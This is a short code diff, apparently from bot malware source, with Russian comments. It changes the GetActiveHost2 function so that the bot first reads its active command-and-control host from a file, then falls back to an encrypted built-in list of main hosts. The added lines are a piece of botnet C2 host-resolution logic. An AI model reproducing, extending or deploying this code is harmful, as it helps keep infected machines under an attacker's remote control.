@@ -355,6 +355,18 @@ PCHAR GetActiveHost()
 string GetActiveHost2()
 {
 	// Функция возвращает активный (доступный) хост
+	#ifndef DEBUGCONFIG
+		PCHAR Host  = NULL;
+
+		// Первым этапом пытаемся получить хост из файла
+		if (Hosts::GetActiveHostFormFile(NULL, Host))
+		{
+			CFGDBG("Cofig", "Полусили хост из файла");
+			string Result(Host);
+			STR::Free(Host);
+			return Result;
+		}
+	#endif
 	return GetActiveHostFromBuf2(BOT_MAINHOSTS_ARRAY, BOTPARAM_HASH_MAINHOSTS, BOTPARAM_ENCRYPTED_MAINHOSTS);
 }
 //-----------------------------------------------------------------------------
